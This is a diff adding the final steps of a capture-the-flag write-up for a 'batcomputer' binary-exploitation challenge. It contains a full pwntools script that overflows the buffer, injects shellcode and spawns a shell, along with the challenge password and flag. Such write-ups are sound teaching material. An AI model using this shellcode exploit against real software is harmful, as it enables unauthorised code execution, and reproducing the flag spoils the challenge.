@@ -114,4 +114,88 @@ It's your time to save the world!
 
 
 23. Means we need to write 84 bytes, then the return address (the location of joker), enter the password, enter the shellcode.
-24. 
+24. Now for the exploit script, to extract the stack offset, i used `pwntools` to make this regex.
+
+```py
+extractedStack_addr = int(re.search(r"(0x[\w\d]+)", sh.recvlineS()).group(0), 16)
+```
+
+25. Now for the shellcode, we can utilize the `shellcraft`.
+26. First, we need to pop registers at the beginning se we have room to inject shellcode.
+27. For the padding value , we can use this formula:
+
+```py
+padding = asm('nop') * (paddingBytes - len(shellcode)) 
+```
+
+28. So here is our final script:
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else: 
+        return process([exe] + argv, *a, **kw)
+
+exe = './batcomputer'
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'debug'
+
+## EXPLOITATION
+
+paddingBytes = 84 #EIP/RIP offset
+sh = start()
+
+sh.sendlineafter('>', '1')
+extractedStack_addr = int(re.search(r"(0x[\w\d]+)", sh.recvlineS()).group(0), 16)
+info("extractedStack_addr (joker's offset): %#x", extractedStack_addr)
+
+shellcode = asm(shellcraft.popad()) 
+shellcode += asm(shellcraft.sh())
+padding = asm('nop') * (paddingBytes - len(shellcode)) 
+
+payload = flat([
+    padding,
+    shellcode,
+    extractedStack_addr
+])
+
+sh.sendlineafter(b'>', b'2') 
+sh.sendlineafter(b'Enter the password:', b'b4tp@$$w0rd!') 
+sh.sendlineafter(b'Enter the navigation commands:', payload) 
+sh.sendlineafter(b'>', b'130') # to trigger return 
+sh.recvuntil("Too bad, now who's gonna save Gotham? Alfred?\n")
+
+sh.interactive()
+
+```
+
+> OUTPUT
+
+![image](https://user-images.githubusercontent.com/70703371/209521025-4a04b417-cbdd-4d26-be13-5ab04c9a6e78.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/209521063-df20c595-fb57-44af-b01a-0296b8ca3154.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/209521083-f75e7023-e6e4-4e1e-8668-699835443529.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/209521119-0b3ce4e4-6532-4f08-bd7e-694a3420f297.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/209521140-428fae0e-3176-4fda-baa8-6f95c799f629.png)
+
+
+29. Got the flag!
+
+## FLAG
+
+```
+HTB{l0v3_y0uR_sh3llf_U_s4v3d_th3_w0rld!}
+```
